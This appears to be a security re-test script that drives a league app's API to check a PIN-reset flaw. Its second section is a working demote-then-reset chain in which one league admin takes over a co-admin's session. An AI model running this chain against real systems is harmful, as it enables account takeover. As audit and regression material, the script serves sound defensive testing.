"""SEC-15 re-drive (Batch 122) plus the demote-then-reset chain."""

from lib import call, ids, login, note, section
from lib import M

A = M["leagues"]["a"]["slug"]

section("SEC-15: league admin reset targets")
note("alice = league admin A (ordinary player site-wide). sadie = SITE ADMIN, plain member of A.")
note("gary = admin of league B, plain member of A. carol = ordinary member of A.")
call("POST", f"/api/v1/leagues/{A}/members/{ids('sadie')}/reset-pin", "alice")
call("POST", f"/api/v1/leagues/{A}/members/{ids('gary')}/reset-pin", "alice")
call("POST", f"/api/v1/leagues/{A}/members/{ids('carol')}/reset-pin", "alice")
note("carol (ordinary member) reset still works; carol re-claims her own PIN:")
call("POST", "/api/v1/auth/pin/set", body={"display_name": "Carol", "pin": "8351"})
login("Carol", "8351")

section("SEC-15 residual: demote a co-admin, then reset them")
note("hank = second admin of league A, admin of nothing else. Attacker = alice.")
call("POST", f"/api/v1/leagues/{A}/members/{ids('hank')}/reset-pin", "alice")
call("POST", f"/api/v1/leagues/{A}/members/{ids('hank')}/demote", "alice")
call("POST", f"/api/v1/leagues/{A}/members/{ids('hank')}/reset-pin", "alice")
note("claim window is open; the attacker (no auth) chooses hank's PIN:")
call("POST", "/api/v1/auth/pin/set", body={"display_name": "Hank", "pin": "7294"})
r = login("Hank", "7294")
if r.status_code == 200:
    t = r.json()["access_token"]
    call("GET", "/api/v1/auth/me", bearer=t)
    note("=> alice now holds a session as hank.")
